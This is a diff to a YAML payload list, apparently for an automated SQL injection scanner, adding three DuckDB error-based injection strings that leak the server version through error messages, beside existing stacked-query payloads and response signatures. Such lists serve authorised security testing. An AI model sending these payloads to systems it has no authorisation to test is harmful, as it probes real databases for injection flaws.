@@ -68,6 +68,14 @@ payloads:
     - "'; SELECT 1-- -"
     - "1; SELECT 1-- -"
 
+  duckdb_version:
+    # Read-only impact proof for a DuckDB-backed query: error(version()) embeds the version in a
+    # DuckDB "Invalid Input Error: <version>" message (surfaced in a GraphQL errors[] message).
+    # Detection-only — reads server metadata, no writes/stacked queries.
+    - "x', (SELECT error(version())) as v, '"
+    - "x', (SELECT error(version())) as v, '-- -"
+    - "1', (SELECT error(version())) as v, '"
+
 # Detection signatures (used by agent to classify responses)
 error_signatures:
   - "you have an error in your sql syntax"
